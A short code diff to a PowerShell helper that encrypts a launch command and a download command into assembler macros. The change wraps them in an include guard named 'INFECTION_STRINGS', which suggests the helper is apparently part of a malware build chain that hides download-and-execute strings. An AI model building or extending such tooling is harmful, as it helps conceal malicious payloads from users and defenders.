@@ -34,5 +34,10 @@ function Encrypt-String {
     Write-Output ("%endmacro")
 }
 
-Encrypt-String -str $launch_command -label "LAUNCH_COMMAND" | Out-File -FilePath $output -Encoding UTF8
+Write-Output "" | Out-File -FilePath $output -Encoding UTF8
+Write-Output "%ifndef INFECTION_STRINGS" | Out-File -FilePath $output -Encoding UTF8 -Append
+Write-Output "%define INFECTION_STRINGS" | Out-File -FilePath $output -Encoding UTF8 -Append
+Encrypt-String -str $launch_command -label "LAUNCH_COMMAND" | Out-File -FilePath $output -Encoding UTF8 -Append
 Encrypt-String -str $download_command -label "DOWNLOAD_COMMAND" | Out-File -FilePath $output -Encoding UTF8 -Append
+Write-Output "%endif" | Out-File -FilePath $output -Encoding UTF8 -Append
+
